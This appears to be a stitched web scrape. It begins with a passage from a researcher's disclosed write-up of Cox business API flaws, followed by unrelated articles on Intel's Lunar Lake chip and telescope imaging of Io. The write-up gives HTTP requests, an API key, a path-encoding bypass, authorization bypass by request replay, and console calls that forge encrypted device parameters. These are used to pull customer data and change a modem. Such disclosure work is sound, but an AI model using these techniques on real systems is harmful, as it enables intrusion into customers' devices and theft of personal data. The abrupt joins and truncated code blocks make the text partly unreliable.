<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/swagger-ui/index.html</span>
<span>✅</span> <span>GET</span> <span>/api/cbma/userauthorization/swagger-ui/index.html</span>

<p>We had a hit! There was a swagger landing page at <code>/api/cbma/profile/swagger-ui/index.html</code>. I loaded the page expecting to see API routes, however...</p>

<p>Totally empty. Something was causing the page not to load. I checked the network traffic and there seemed to be in an infinite redirect loop when attempting to load any static resource:</p>
<pre><code><span>GET</span> <span>/api/cbma/ticket/services/swagger-ui/swagger-initializer.js</span> <span>HTTP/1.1</span>
<span>Location:</span> <span>/cbma/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js</span>
<span>...</span>
<span>GET</span> <span>/cbma/api/cbma/ticket/services/swagger-ui/swagger-initializer.js</span> <span>HTTP/1.1</span>
<span>Location:</span> <span>/cbma/cbma/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js</span>
</code></pre>
<p>It seemed that requests to load static resources for the page (<code>.png</code>, <code>.js</code>, <code>.css</code>) were all being routed through the base URI instead of the reverse proxy API host. What this meant was there was probably a proxy rule for static assets, so I changed the extension to test this:</p>
<pre><code><span>GET</span> <span>/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.anythingElse</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>500</span> <span>Internal</span> <span>Server</span> <span>Error</span>
<span>Server:</span> <span>nginx</span>
</code></pre>
<p>After confirming that the <code>.js</code> extension was triggering the routing of the request to the original host, we now needed to find a way to load the resource from the API reverse proxy but without hitting the rule condition which switched routing for static files. The simplest way to do this, since the request was being proxied, was to check if there was any character that we could add which would “drop off” in transit.</p>
<h3 id="loading-static-resources-from-reverse-proxy-api">Loading Static Resources from Reverse Proxy API</h3>
<p>To fuzz this, I simply used Burp’s intruder to enumerate from <code>%00</code> to <code>%FF</code> at the end of the URL. After about 30 seconds of running, we had a 200 OK by appending the URL encoded <code>/</code> symbol:</p>
<pre><code><span>GET</span> <span>/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js%2f</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP</span>/<span>2</span> <span>200</span> <span>OK</span>

</code></pre>
<p>By appending the <code>%2f</code> to the <code>.js</code> extension, we could load the JS files. I wrote a rule to append <code>%2f</code> to all static resources using Burp’s match-and-replace then reloaded the page.</p>

<p>Perfect, the swagger routes had loaded. I used the same trick to load all the swagger docs on all of the other API endpoints. In total, there were about 700 different API calls with each API having the following number of calls:</p>
<pre><code>account (115 routes)
voiceutilities (73 routes)
user (70 routes)
datainternetgateway (57 routes)
accountequipment (55 routes)
billing (53 routes)
ticket (52 routes)
profile (47 routes)
voicecallmanagement (46 routes)
voicemail (37 routes)
voiceusermanagement (30 routes)
userauthorization (24 routes)
csr (16 routes)
voiceprofile (14 routes)
</code></pre>
<p>After quickly skimming through everything, the following APIs appeared to have the most functionality for interacting with hardware and accessing customer accounts:</p>
<pre><code>accountequipment (55 routes)
datainternetgateway (57 routes)
account (115 routes)
</code></pre>
<p>Copying the HTTP request that I’d used to register to the website, I ran an intruder script to hit every single GET endpoint to check if there were any accessible unauthenticated API endpoints. What came back was really interesting. There was a 50/50 split of endpoints which gave an authorization error or 200 OK HTTP response.</p>

<p>After the intruder scan of all of the API endpoints completed, I scrolled through to see if any had any interesting responses. The following "profilesearch" endpoint had an interesting HTTP response which appeared to be returning a blank JSON object from what looked to be an empty search:</p>
<pre><code><span>GET</span> <span>/api/cbma/profile/services/profile/profilesearch/</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>"message":</span> <span>"Success"</span>,
  <span>"profile":</span> {
    <span>"numberofRecords":</span> <span>"0 hits"</span>,
    <span>"searchList":</span> []
  }
}
</code></pre>
<p>From looking at the JavaScript, it seemed that we’d need to add an argument to the URI for a profile to search for. I went ahead and typed in <code>test</code> into the URI and got the following response:</p>
<pre><code><span>{</span>
  <span>"message"</span><span>:</span> <span>"Authorization Error-Invalid User Token"</span>
<span>}</span>
</code></pre>
<p>Invalid user token? But I’d just been able to hit this endpoint? I removed the word <code>test</code> from the URI and resent this request. Another authorization error! For some reason, the original endpoint without parameters was now returning an authorization error even though we could just hit it when running intruder.</p>
<p>I did a sanity check and confirmed that nothing had changed between the request in intruder and my repeater request. I replayed the request one more time, but surprisingly this time it gave me the original 200 OK and the JSON response from intruder! What was going on? It seemed to be intermittently giving me authorization errors or saying that the request had been successful.</p>
<p>To test if I could reproduce this with an actual search query, I wrote down <code>cox</code> in the URI and replayed the request 2-3 more times until I saw the following response:</p>
<pre><code><span>{</span>
  <span>"message"</span><span>:</span> <span>"Success"</span><span>,</span>

<p>Woah! These looked like profiles of Cox business customers. Not really expecting results, I replaced the word "cox" with "fbi" to see if it was actually pulling customer data:</p>

<p>Oh, no. The above response contained the physical addresses of several FBI field offices who were Cox business customers. The administrative customer search API request was working. Not good!</p>
<p>We had confirmed that we could bypass authorization for the API endpoints by simply replaying the HTTP request multiple times, and there were over 700 other API requests that we could hit. It was time to see what the real impact was.</p>
<h3 id="confirming-we-can-access-anyones-equipment">Confirming We Can Access Anyone's Equipment</h3>
<p>I looked back at the results of the intruder scan, now knowing that I could bypass authorization by simply replaying a request. In order to figure out if this vulnerability could've been used to hack my modem, I needed to know if this API had access to the residential network at an access control level. Cox offered both residential and business services, but under the hood, I was guessing that the underlying API had access to both.</p>
<p>I went ahead and pulled out the simplest looking request that took in a <code>macAddress</code> parameter to test if I could access my own modem via the API.</p>
<pre><code>/api/cbma/accountequipment/services/accountequipment/ipAddress?macAddress=:mac
</code></pre>
<p>This was a GET request to retrieve a modem IP address that required a <code>macAddress</code> parameter. I logged into Cox, retrieved my own MAC address, then sent the HTTP request over-and-over until it returned 200 OK:</p>
<pre><code><span>GET</span> <span>/api/cbma/accountequipment/services/accountequipment/ipAddress?macAddress=f80c58bbcb90</span> <span>HTTP/1.1</span>

<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-type:</span> <span>application/json</span>

  <span>"message":</span> <span>"Success"</span>,
  <span>"ipv4":</span> <span>"98.165.155.8"</span>
}
</code></pre>
<p>It worked! We were accessing our own device through the Cox Business website API! This meant that whatever was running on this could actually be used to talk to the devices. Cox provided service to millions of customers, and this API seemingly allowed me to directly communicate via MAC address with anyone's device.</p>
<p>The next question I had was whether or not we could retrieve the MAC addresses of the hardware connected to someone's account via searching their account ID (which we had retrieved previously through the customer query endpoint). I found the <code>accountequipment/services/accountequipment/v1/equipments</code> endpoint in my swagger list and threw it in my Burp Repeater with my own account ID. It returned the following information:</p>
<pre><code><span>GET</span> <span>/api/cbma/accountequipment/services/accountequipment/v1/equipments/435008132203</span> <span>HTTP/1.1</span>

<p>Another similar POST account update request worked. This confirmed we could read and write to business accounts.</p>
<p>At this point, I'd demonstrated that it was possible to (1) search a customer and retrieve their business account PII using only their name, then (2) retrieve the MAC addresses of the connected hardware on their account, then (3) run commands against the MAC address via the API. It was time to find some API endpoints that actually wrote to the device to simulate an attacker attempting to get code execution.</p>

<p>Looking through the swagger docs, it seemed that every hardware modification requests (e.g. update device password) required a parameter called <code>encryptedValue</code>. If I could find a way to generate this value, then I could demonstrate write access to modems which would lead to remote code execution.</p>
<p>To know if I could even generate this <code>encryptedValue</code> parameter, I had to dig through the original JavaScript to figure out exactly how it was being signed.</p>

<p>After tracing the <code>encryptedValue</code> parameter back through the JavaScript, I landed on these two functions:</p>
<pre><code><span>encryptWithSaltandPadding</span>(<span>D</span>) {
    <span>const</span> k = n.<span>AES</span>.<span>encrypt</span>(D, <span>this</span>.<span>getKey</span>(), {

    }).<span>ciphertext</span>.<span>toString</span>(n.<span>enc</span>.<span>Base64</span>);
    <span>return</span> <span>btoa</span>(s.<span>IV</span> + <span>"::"</span> + s.<span>qs</span> + <span>"::"</span> + k)
}
</code></pre>
<pre><code><span>decryptWithSaltandPadding</span>(<span>D</span>) {
    <span>const</span> W = <span>atob</span>(D),
        k = <span>this</span>.<span>sanitize</span>(W.<span>split</span>(<span>"::"</span>)[<span>2</span>]),
        M = n.<span>lib</span>.<span>CipherParams</span>.<span>create</span>({
            <span>ciphertext</span>: n.<span>enc</span>.<span>Base64</span>.<span>parse</span>(k)
        });
    <span>return</span> n.<span>AES</span>.<span>decrypt</span>(M, <span>this</span>.<span>getKey</span>(), {
        <span>iv</span>: n.<span>enc</span>.<span>Hex</span>.<span>parse</span>(s.<span>IV</span>)
    }).<span>toString</span>(n.<span>enc</span>.<span>Utf8</span>)
}
</code></pre>
<p>Both of these functions took in variables which only existed at runtime, so the easiest way to actually call these functions would be to find somewhere it was called within the actual UI. After searching for a little while, I’d realized that the 4-digit PIN that I set when registering my account was encrypted using the same function!</p>

<p>I set a breakpoint at exactly where the <code>encryptWithSaltAndPadding</code> function was called, then hit enter.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Now that I had a breakpoint set and I was in the correct context for the function I could simply paste the function into my console and run whatever I wanted. To validate that it worked, I copied the encrypted value of the PIN code that was sent in the POST request and passed it to the decrypt function.</p>
<pre><code>t.<span>cbHelper</span>.<span>decryptWithSaltandPadding</span>(<span>"OGEzMjNmNjFhOTk2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjova3paY1orSjRGR0YwWGFvRkhwWHZRPT0="</span>)
<span>"8042"</span>
</code></pre>
<p>Perfect! It worked as expected. The only issue now was getting the encrypted value of a device. I asked around for a while until I found a friend who owned a MSP a few states away who used Cox Business. They gave me a login to their account and I saw what appeared to be an <code>encryptedValue</code> parameter in one of the HTTP responses after authenticating into their account. I copied this value and passed it to the decrypt function once again:</p>
<pre><code>t.<span>cbHelper</span>.<span>decryptWithSaltandPadding</span>(<span>"OGEzMjNmNjFhOTk2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjpiYk1SNGQybzFLZHhRQ1VQNnF2TWl1QlZ0NEp6WVUyckJGMXF5T0dYTVlaNWdjZkhISTZnUFppdjM3dmtRSUcxclNkMC9WNmV2WFE1eko0VnFZUnFodz09"</span>)

</code></pre>
<p>Well, that’s annoying. It looked like the encrypted parameter had the MAC address, but also an account ID and a few extra parameters.</p>
<pre><code><span>541051614702</span> <span>=</span> <span>Cox</span> <span>Account</span> <span>Number</span>
<span>DTC4131</span> <span>=</span> <span>Device</span> <span>Name</span>

<span>Internet</span> <span>=</span> <span>Label</span>
</code></pre>
<p>If there was some validation which checked that the MAC address matched the account ID it would make exploiting this somewhat complicated. I investigated further.</p>
<h2 id="executing-commands-on-any-modem">Executing Commands on Any Modem</h2>
<p>On a leap of faith, I tried signing an “encryptedValue” string with junk data for everything except the MAC address (e.g. <code>123456789012;1234567;123456789;1;f4:c1:14:70:4d:ac;ANYTHING</code>) to see if it actually validated that the account ID matched the MAC address:</p>
<pre><code>t.<span>cbHelper</span>.<span>encryptWithSaltandPadding</span>(<span>"123456789012;1234567;123456789;1;f4:c1:14:70:4d:ac;ANYTHING"</span>)

</code></pre>
<p>The only thing in the above parameter that was valid was the device serial number. If this request worked, it meant that I could use an “encryptedValue” parameter in the API that didn’t have to have a matching account ID.</p>
<p>I sent the request and saw the exact same HTTP response as above! This confirmed that we didn’t need any extra parameters, we could just query any hardware device arbitrarily by just knowing the MAC address (something that we could retrieve by querying a customer by name, fetching their account UUID, then fetching all of their connected devices via their UUID). We now had essentially a full kill chain.</p>
<p>I formed the following HTTP request to update my own device MAC addresses SSID as a proof of concept to update my own hardware:</p>

<p>Did it work? It had only given me a blank 200 OK response. I tried re-sending the HTTP request, but the request timed out. My network was offline. The update request must've reset my device.</p>
<p>About 5 minutes later, my network rebooted. The SSID name had been updated to “Curry”. I could write and read from anyone's device using this exploit.</p>

<p>This demonstrated that the API calls to update the device configuration worked. This meant that an attacker could've accessed this API to overwrite configuration settings, access the router, and execute commands on the device. At this point, we had a similar set of permissions as the ISP tech support and could've used this access to exploit any of the millions of Cox devices that were accessible through these APIs.</p>
<p>I reached out to Cox via their responsible disclosure page and shared details of the vulnerability. They took down the exposed API calls within six hours then began working on the authorization vulnerabilities. I was no longer able to reproduce any of the vulnerabilities the next day.</p>
<h2 id="impact">Impact</h2>
<p>This series of vulnerabilities demonstrated a way in which a fully external attacker with no prerequisites could've executed commands and modified the settings of millions of modems, accessed any business customer's PII, and gained essentially the same permissions of an ISP support team.</p>
<p>Cox is the largest private broadband provider in the United States, the third-largest cable television provider, and the seventh largest telephone carrier in the country. They have millions of customers and are the most popular ISP in 10 states.</p>
<p>An example attack scenario would've looked like the following:</p>
<ol>
<li>Search for a Cox business target through the exposed APIs using their name, phone number, email address, or account number</li>
<li>Retrieve their full account PII via querying the returned UUID from step one including device MAC addresses, email, phone number, and address</li>
<li>Query their hardware MAC address to retrieve Wifi password and connected devices</li>
<li>Execute arbitrary commands, update any device property, and takeover victim accounts</li>
</ol>
<p>There were over 700 exposed APIs with many giving administrative functionality (e.g. querying the connected devices of a modem). Each API suffered from the same permission issues where replaying HTTP requests repeatedly would allow an attacker to run unauthorized commands.</p>
<h2 id="addendum">Addendum</h2>
<p>After reporting the vulnerability to Cox, they investigated if the specific vector had ever been maliciously exploited in the past and found no history of abuse (the service I found the vulnerabilities in had gone live in 2023, while my device had been compromised in 2021). They had also informed me that they had no affiliation with the DigitalOcean IP address, meaning that the device had definitely been hacked, just not using the method disclosed in this blog post.</p>
<p>I'm still super curious on the exact way in which my device was compromised as I had never made my modem externally accessible nor even logged into the device from my home network. This blog post really aims to highlight vulnerabilities in the layer of trust between the ISP and customer devices, but the modem could've been compromised by some other much more boring method (e.g. local CSRF to RCE 0day which I triggered locally within my home network).</p>
<p>One of the things I'll never understand was why the attacker was replaying my traffic? They were clearly in my network and could access everything without being detected, why replay all the HTTP requests? So odd.</p>
<p>Anyway, thanks for reading! More than happy to listen to any theories, comments, or whatever about what happened here. Feel free to reach out at samwcurry (symbol goes here) gmail (dot goes here) com.</p>

        <div>
            <p>Intel this morning is lifting the lid on&nbsp;some of the finer architectural and technical details about its upcoming Lunar Lake SoC – the chip that will be the next generation of Core Ultra mobile processors. Once again holding one of their increasingly regular Tech Tour events for media and analysts, Intel this time set up shop in Taipei just before the beginning of Computex 2024. During the Tech Tour, Intel disclosed numerous facets of Lunar Lake, including their new P-Core design codenamed <em>Lion Cove</em> and a new wave of E-cores that are a bit more like Meteor Lake's pioneering Low Power Island E-Cores. Also disclosed was the Intel NPU 4, which Intel claims delivers up to 48 TOPS, surpassing&nbsp;Microsoft's Copilot+ requirements for the new age of AI PCs.</p>

<p>Intel's Lunar Lake represents a strategic evolution in their mobile SoC lineup, building on their Meteor Lake launch last year, focusing&nbsp;on&nbsp;enhancing power efficiency and optimizing performance across the board. Lunar Lake dynamically allocates tasks to efficient cores (E-cores) or performance cores (P-cores) based on workload demands by leveraging advanced scheduling mechanisms, which are assigned to ensure optimal power usage and performance. Still, once again, Intel Thread Director, along with Windows 11, plays a pivotal role in this process, guiding the OS scheduler to make real-time adjustments that balance efficiency with computational power depending on the intensity of the workload.</p>

<h3>Lunar Lake: Designed By Intel, Built By TSMC (&amp; Assembled By Intel)</h3>

<p>While there are many aspects of Lunar Lake to dive into, perhaps it's best we start with what's sure to be the most eye-catching: who's building it.</p>

<p>Intel's Lunar Lake tiles are not being fabbed using any of their own foundry facilities – a sharp departure from historical precedence, and even the recent Meteor Lake, where the compute tile was made using the Intel 4 process. Instead, both tiles of the disaggregated Lunar Lake are being fabbed over at TSMC, using a mix of TSMC's N3B and N6 processes. In 2021 Intel set about freeing their chip design groups to use the best foundry they could – be it internal or external – and there's no place that's more apparent than here.</p>

<p>Overall, Lunar Lake represents their second generation of disaggregated SoC architecture for the mobile market, replacing the Meteor Lake architecture in the lower-end space.&nbsp;At this time, Intel has disclosed that it uses a 4P+4E (8 core) design, with hyper-threading/SMT disabled, so the total thread count supported by the processor is simply the number of CPU cores, e.g., 4P+4E/8T.</p>

<p><a href="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_AI%20on%20Client%20PCs-49.png"><img alt="" src="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_AI%20on%20Client%20PCs-49.png"></a></p>

<p>The build-up of Lunar Lake combines a synergetic collaboration between Intel’s architectural design team and TSMC's manufacturing process nodes to bring the latest Lion Cove P-cores to Lunar Lake, which boosts Intel's architectural IPC as you would expect from a new generation. At the same time, Intel also&nbsp;introduces the Skymont E-cores, which replace the Low Power Island Cresmont E-cores of Meteor Lake. Notably, however, these E-cores don't connect to the ring bus like the P-cores, which makes them a sort of hybrid LP E-core, combining the efficiency gains of the more advanced TSMC N3B node with the double-digit gains in IPC over the previous Crestmont cores.</p>

<p>The entire compute tile, including the P and E-cores, is built on TSMC's N3B node, while the SoC tile is made using the TSMC N6 node.</p>

<p>At a higher level, Intel is once again using their Foveros packaging technology here. Both the compute and SoC (now the "Platform Controller") tiles sit on top of a base tile, which provides high-speed/low-power routing between the tiles, and further connectivity to the rest of the chip and beyond.</p>

<p>In another first for a mainstream Intel Core product, the Lunar Lake SoC platform also&nbsp;includes up to 32 GB of LPDDR5X memory on the chip package itself. This is arranged as a pair of 64-bit memory chips, offering a total 128-bit memory interface. As with other vendors using on-package memory, this change means that users can't just upgrade DRAM at-will, and the memory configurations for Lunar Lake will ultimately be determined by what SKUs Intel opts to ship.</p>

<p><a href="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_AI%20on%20Client%20PCs-51.png"><img alt="" src="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_AI%20on%20Client%20PCs-51.png"></a></p>

<p>With Lunar Lake, Intel is also strongly focusing on AI, as the architecture integrates a new NPU called NPU 4. This NPU is rated for up to 48 TOPS of INT8 performance, thus making it Microsoft Copilot+ AI PC ready. This is the bar all of the PC SoC vendors are aiming for, including AMD and Qualcomm too.</p>

<p>Intel's integrated GPU will also be a contributing player here. While not the highly efficient machine that the dedicated NPU is, the Arc Xe2-LPG brings dozens of additional T(FL)OPS of performance with it, and some additional flexibility an NPU doesn't come with. Which is why you'll also see Intel rating the performance of these chips in terms of total platform TOPS – in this case, 120 TOPS.</p>

<p>Intel's collaboration with Microsoft further enhances workload management through the fabled Intel Thread Director, optimized for applications such as the Copilot assistant. Given the time of the introduction of Lunar Lake, it somewhat sets the stage for a Q3 2024 launch, which coincides with the&nbsp;holiday 2024 market.</p>

<h3>Intel Lunar Lake: Updating Intel Thread Director &amp; Power Management Improvements</h3>

<p>To say that energy efficiency is a key goal for Lunar Lake would be an understatement. For as much as Intel is riding high in the mobile PC CPU market (AMD's share there is still but a fraction), the company has been feeling the pressure over the last few years from customer-turned-rival Apple, whose M-series Apple Silicon has been setting the bar for power efficiency over the last few years. And now with Qualcomm attempting to do the same things for the Windows ecosystem with their forthcoming Snapdragon X chips, Intel is preparing to make their own power play.</p>

<p>Intel's Thread Director and power management updates for Lunar Lake show various and significant improvements compared to Meteor Lake. The Thread Director uses a heterogeneous scheduling policy, initially assigning tasks to a single E-core and expanding to other E-cores or P-cores as and when needed. OS containment zones are designed to limit tasks to specific cores, which directly improves power efficiency and delivers the performance needed by the right core for the workload at hand.&nbsp;Integration with power management systems and a quad array of Power Management Controllers (PMC) further allows the chip, in concert with Windows 11, to make context-aware adjustments, ensuring optimal performance with minimal power usage and wastage.</p>

<p><a href="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-04.png"><img alt="" src="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-04.png"></a></p>

<p>Lunar Lake's scheduling strategy effectively handles power-sensitive applications. One example Intel gave is that&nbsp;video conferencing tasks are kept within the efficiency core cluster, utilizing the E-cores to maintain performance while reducing power consumption by up to 35%, as shown by Intel's provided data. These improvements are achieved through collaboration with OS developers such as Microsoft for seamless integration for optimizing for the best balance between power consumption and performance.</p>

<p><a href="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-19.png"><img alt="" src="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-19.png"></a></p>

<p>Focusing on the power management system for Lunar Lake, Intel uses its SoC power management, operating in efficiency, balance, and performance modes tailored and designed to adapt to whatever the demands of the workload at the time of operation. This multi-layered approach allows the Lunar Lake SoC to operate efficiently. Again,&nbsp;much like the Intel&nbsp;Thread Director, the PMCs can&nbsp;balance power usage with performance needs.</p>

<p><a href="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-17.png"><img alt="" src="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-17.png"></a></p>

<p>Intel further plans to enhance the Thread Director by increasing scenario granularity, implementing AI-based scheduling hints, and enabling cross-IP scheduling within Windows 11. These enhancements essentially equate to workload management designed to boost overall power efficiency and deliver performance across various applications when needed without wasting power budget by allocating lighter tasks to the higher power P-cores.</p>

<p>Over the next few pages, we'll explore the new P and E cores and Intel's update to ther integrated Arc Xe (Xe2-LPG) graphics.</p>

    </div><p>New images of Jupiter's volcano-studded moon Io, taken by the Large Binocular Telescope on Mount Graham in Arizona, offer the highest resolution of Io ever achieved with an Earth-based instrument. The observations were made possible by a new high-contrast optical imaging instrument, dubbed SHARK-VIS, and the telescope's adaptive optics system, which compensates for the blurring induced by atmospheric turbulence.</p>


										      
																																	<p>The images, to be published in the journal <i>Geophysical Research Letters</i>, reveal surface features as small as 50 miles across, a spatial resolution that until now had been achievable only with spacecraft sent to Jupiter. This is equivalent to taking a picture of a dime-sized object from 100 miles away, according to the research team.</p>
<p>SHARK-VIS allowed the researchers to identify a major resurfacing event around Pele, one of Io's most prominent volcanoes. According to the paper's first author, Al Conrad, the eruptions on Io, the most volcanically active body in the solar system, dwarf their contemporaries on Earth.</p>
<p>"Io, therefore, presents a unique opportunity to learn about the mighty eruptions that helped shape the surfaces of the Earth and the moon in their distant pasts," said Conrad, associate staff scientist at the Large Binocular Telescope Observatory. The Large Binocular Telescope, or LBT, is part of Mount Graham International Observatory, a division of the University of Arizona Steward Observatory.</p>
<p>Conrad added that studies like this one will help researchers understand why some worlds in the solar system are volcanic but not others. They also may someday shed light on volcanic worlds in exoplanet systems around nearby stars.</p>
<p>Slightly larger than Earth's moon, Io is the innermost of Jupiter's Galilean moons, which in addition to Io, include Europa, Ganymede and Callisto. Locked in a gravitational "tug of war" among Jupiter, Europa and Ganymede, Io is constantly being squeezed, leading to frictional heat buildup in its interior—believed to be the cause for its sustained and widespread volcanic activity.</p>

																																						
																																			<p>By monitoring the eruptions on Io's surface, scientists hope to gain insights into the heat-driven movement of material underneath the moon's surface, its internal structure and ultimately, on the tidal heating mechanism responsible for Io's intense volcanism.</p>
<p>Io's volcanic activity was first discovered in 1979, when Linda Morabito, an engineer on NASA's Voyager mission, spotted an eruption plume in one of the images taken by the spacecraft during its famous "Grand Tour" of the outer planets. Since then, countless observations have been made that document Io's restless nature, from both space and Earth-based telescopes.</p>

<p>Study co-author Ashley Davies, a principal scientist at NASA's Jet Propulsion Laboratory, said the new image taken by SHARK-VIS is so rich in detail that it has allowed the team to identify a major resurfacing event in which the plume deposit around a prominent volcano known as Pele, located in Io's southern hemisphere close to the equator, is being covered by eruption deposits from Pillan Patera, a neighboring volcano. A similar eruption sequence was observed by NASA's Galileo spacecraft, which explored the Jupiter system between 1995 and 2003.</p>
<p>"We interpret the changes as dark lava deposits and white sulfur dioxide deposits originating from an eruption at Pillan Patera, which partially cover Pele's red, sulfur-rich plume deposit," Davies said. "Before SHARK-VIS, such resurfacing events were impossible to observe from Earth."</p>

																																			<p>While telescope images in the infrared can detect hot spots caused by ongoing volcanic eruptions, they are not sharp enough to reveal surface details and unambiguously identify the locations of the eruptions, explained co-author Imke de Pater, professor emerita of astronomy at the University of California—Berkeley.</p>
<p>"Sharper images at <a href="https://phys.org/tags/visible+wavelengths/" rel="tag">visible wavelengths</a> like those provided by SHARK-VIS and LBT are essential to identify both locations of <a href="https://phys.org/tags/eruptions/" rel="tag">eruptions</a> and surface changes not detectable in the infrared, such as new plume deposits," de Pater said, adding that visible light observations provide researchers with vital context for the interpretation of infrared observations, including those from spacecraft such as Juno, which is currently orbiting Jupiter.</p>
<p>SHARK-VIS was built by the Italian National Institute for Astrophysics at the Rome Astronomical Observatory and is managed by a team led by principal investigator Fernando Pedichini, assisted by project manager Roberto Piazzesi.</p>
<p>In 2023, it was installed, together with its complementary near-infrared instrument SHARK-NIR, at the LBT to fully take advantage of the telescope's outstanding adaptive optics system. The instrument houses a fast, ultra-low-noise camera that allows it to observe the sky in "fast imaging" mode, capturing slow-motion footage that freezes the optical distortions caused by atmospheric turbulence, and to post-process data to an unprecedented sharpness.</p>

																																						
																																			<p>Gianluca Li Causi, data processing manager for SHARK-VIS at the Italian National Institute for Astrophysics, explained, "We process our data on the computer to remove any trace of the sensor's electronic footprint. We then select the best frames and combine them using a highly efficient software package called Kraken, developed by our colleagues Douglas Hope and Stuart Jefferies from Georgia State University. Kraken allows us to remove atmospheric effects, revealing Io in incredible sharpness."</p>
<p>SHARK-VIS instrument scientist Simone Antoniucci said he anticipates new observations to be made of objects throughout the solar system.</p>
<p>"The keen vision of SHARK-VIS is particularly suited to observing the surfaces of many solar system bodies, not only the moons of giant planets but also asteroids," he said. "We have already observed some of those, with the data currently being analyzed, and are planning to observe more."</p>
